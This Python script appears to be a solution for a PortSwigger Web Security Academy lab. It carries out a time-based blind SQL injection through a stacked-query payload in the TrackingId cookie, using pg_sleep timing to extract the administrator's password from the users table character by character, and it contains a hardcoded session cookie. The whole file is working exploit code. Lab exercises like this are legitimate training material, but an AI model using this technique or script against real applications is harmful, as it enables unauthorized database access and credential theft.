import pwn
import string
import time
import requests
import signal
import sys

# Ctrl + c
def def_handler(sig, frame):
    p1.failure("Brute force attack cancelled")
    print("\n[X] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# SQLI

characters = string.ascii_lowercase + string.digits
p1 = pwn.log.progress("SQLI")

def makeSQLI():
    password=""
    p1.status("Starting brute force attack")
    time.sleep(1)

    p2 = pwn.log.progress("Password")



    for position in range(1,21):
        for char in characters:

            cookies = {"TrackingId":f"'%3b select  case when(username='administrator' and substring(password,{position},1)='{char}') then pg_sleep(3) else pg_sleep(0) end from users-- -",
           "session":"GySvyZQaByHzErsQ1Xt7dc5RneH87x42"
            }

            p1.status(cookies["TrackingId"])

            start_time = time.time()
            r = requests.get("https://0a6a002b040d0cbb808e7621005700f0.web-security-academy.net/", cookies=cookies)
            end_time = time.time()

            if (end_time - start_time) > 3:
                password+=char
                p2.status(password)
                break


if __name__ == "__main__":
    makeSQLI()
